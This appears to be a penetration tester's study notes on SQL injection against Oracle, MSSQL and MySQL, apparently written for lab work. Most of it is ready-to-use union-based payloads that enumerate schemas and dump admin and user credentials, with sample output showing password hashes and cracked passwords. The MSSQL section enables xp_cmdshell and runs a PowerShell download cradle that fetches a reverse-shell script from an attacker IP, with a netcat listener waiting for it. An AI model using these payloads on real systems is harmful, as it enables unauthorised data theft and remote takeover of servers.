---
description: find db > table name > table columns > user > pass
---

# SQL Injections & Enum

{% embed url="https://notes.offsec-journey.com/owasp-top-10-exploitation/untitled#mongo-db" %}
Mongo
{% endembed %}

{% embed url="https://guide.offsecnewbie.com/5-sql" %}
SQLi
{% endembed %}

### Common flow (oracle as eg.)

Check for error messages if any hints on facilitating injection syntax

```
a' or '1'='1
```

For a search field attack, enum the number of returning columns (eg oracle db)

```
a' or 'a'='a' order by 4--'
# error

a' or 'a'='a' order by 2--'
# no error

a' or 'a'='a' order by 3--'
# maximum error-free = returning number of columns
```

Enum data type

<pre><code><strong>a' or 'a'='a' union all select 1,2,3 from dual--'
</strong><strong># wrong data type
</strong><strong>
</strong>a' or 'a'='a' union all select 'A','B',3 from dual--'
# correct data type could return results
</code></pre>

Check current db user: `a' or 'a'='a' union all select user,null,3 from dual--'`

List all tables: `a' or 'a'='a' union all select table_name,owner,3 from all_tables--'` and find `table_name` of specific `dbuser` owner

Enum column names: `a' or 'a'='a' union all select column_name,table_name,3 from all_tab_columns--'` and find `column_name` of specific `table_name`&#x20;

List interested contents: `a' or 'a'='a' union all select ADMIN_NAME,PASSWORD,3 from WEB_ADMINS--'`

### MSSQL

{% code overflow="wrap" %}
```
a' or 'a'='a' union all select 'a',2 --'

a' or 'a'='a' union all select user,2 --

a' union all select @@version,2 --
Microsoft SQL Server 2012 - 11.0.2100.60 (X64) Feb 10 2012 19:39:15 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.2 (Build 9200: ) (Hypervisor)

a' union all select user,2 --
dbo

a' union all select name,2 from master ..sysdatabases--'
Song name: master - From the year: 2
Song name: tempdb - From the year: 2
Song name: model - From the year: 2
Song name: msdb - From the year: 2
Song name: music - From the year: 2

a' union all select table_name,2 from INFORMATION_SCHEMA.TABLES--'
Song name: albums - From the year: 2
Song name: singles - From the year: 2
Song name: concerts - From the year: 2
Song name: users - From the year: 2
Song name: songs - From the year: 2

a' union all select column_name,2 from information_schema.columns where table_name='users'--'
Song name: id - From the year: 2
Song name: name - From the year: 2
Song name: pass - From the year: 2

a' union all select name,id from users--'
Song name: alice - From the year: 0
Song name: brett - From the year: 1
Song name: peter - From the year: 2
Song name: eric - From the year: 3

a' or 'a'='a' union all select pass,id from users--'
Artist name: 5f4dcc3b5aa765d61d8327deb882cf99 - From the year: 0
Artist name: 34819d7beeabb9260a5c854bc85b3e44 - From the year: 1
Artist name: 7d9264f1c1c042b799ef08da95a782d4 - From the year: 2
Artist name: 123pass123 - From the year: 3

alice:password
brett:mypassword
peter:123pass123
eric:123pass123

a' union all select null,is_srvrolemember('sysadmin')--'
check whether current db user is sysadmin
1

a' UNION all SELECT null,2; EXEC sp_configure 'show advanced options', 1--
a' UNION all SELECT null,2; RECONFIGURE--
a' UNION all SELECT null,2; EXEC sp_configure 'xp_cmdshell', 1--
a' UNION all SELECT null,2; RECONFIGURE--

python -m http.server 80
nc -nlvp 4444

a' UNION all SELECT null,2; EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://192.168.119.173/rev.ps1'')'--

or \"\" to escape special char
```
{% endcode %}

### MySQL / Maria

{% code overflow="wrap" %}
```

"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"

"1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"

"1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#"

"1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"

"1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"
```
{% endcode %}
